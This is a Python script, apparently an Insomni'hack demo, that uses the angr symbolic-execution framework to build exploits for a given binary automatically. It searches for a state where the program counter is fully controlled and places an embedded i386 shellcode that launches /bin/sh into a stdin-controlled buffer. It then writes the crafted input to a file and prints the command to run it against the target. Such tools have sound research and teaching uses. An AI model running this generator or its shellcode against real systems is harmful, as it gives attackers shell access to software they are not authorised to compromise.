import os
import sys
import angr
from angr import sim_options as so

import logging

l = logging.getLogger("insomnihack.simple_aeg")

# silence some annoying logs
logging.getLogger("angr").setLevel("CRITICAL")

l.setLevel("INFO")

# shellcraft i386.linux.sh
shellcode = "6a68682f2f2f73682f62696e89e331c96a0b5899cd80".decode('hex')

def fully_symbolic(state, variable):
    '''
    check if a symbolic variable is completely symbolic
    '''

    for i in range(state.arch.bits):
        if not state.se.symbolic(variable[i]):
            return False

    return True

def check_continuity(address, addresses, length):
    '''
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    '''

    for i in range(length):
        if not address + i in addresses:
            return False

    return True

def find_symbolic_buffer(state, length):
    '''
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    '''

    # get all the symbolic bytes from stdin
    stdin_file = state.posix.get_file(0)

    sym_addrs = [ ]
    for var in stdin_file.variables():
        sym_addrs.extend(state.memory.addrs_for_name(var))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr

def main(binary):
    p = angr.Project(binary)

    binary_name = os.path.basename(binary)

    extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
    es = p.factory.entry_state(add_options=extras)
    sm = p.factory.simgr(es, save_unconstrained=True)

    # find a bug giving us control of PC
    l.info("looking for vulnerability in '%s'", binary_name)
    exploitable_state = None
    while exploitable_state is None:
        print sm
        sm.step()
        if len(sm.unconstrained) > 0:
            l.info("found some unconstrained states, checking exploitability")
            for u in sm.unconstrained:
                if fully_symbolic(u, u.regs.pc):
                    exploitable_state = u
                    break

            # no exploitable state found, drop them
            sm.drop(stash='unconstrained')

    l.info("found a state which looks exploitable")
    ep = exploitable_state

    assert ep.se.symbolic(ep.regs.pc), "PC must be symbolic at this point"

    l.info("attempting to create exploit based off state")

    # keep checking if buffers can hold our shellcode
    for buf_addr in find_symbolic_buffer(ep, len(shellcode)):
        l.info("found symbolic buffer at %#x", buf_addr)
        memory = ep.memory.load(buf_addr, len(shellcode))
        sc_bvv = ep.se.BVV(shellcode)

        # check satisfiability of placing shellcode into the address
        if ep.satisfiable(extra_constraints=(memory == sc_bvv,ep.regs.pc == buf_addr)):
            l.info("found buffer for shellcode, completing exploit")
            ep.add_constraints(memory == sc_bvv)
            l.info("pointing pc towards shellcode buffer")
            ep.add_constraints(ep.regs.pc == buf_addr)
            break
    else:
        l.warning("couldn't find a symbolic buffer for our shellcode! exiting...")
        return 1

    filename = '%s-exploit' % binary_name
    with open(filename, 'w') as f:
        f.write(ep.posix.dumps(0))

    print "%s exploit in %s" % (binary_name, filename)
    print "run with `(cat %s; cat -) | %s`" % (filename, binary)
    return 0

if __name__ == '__main__':
    if len(sys.argv) > 1:
        sys.exit(main(sys.argv[1]))
    else:
        print "%s: <binary>" % sys.argv[0]
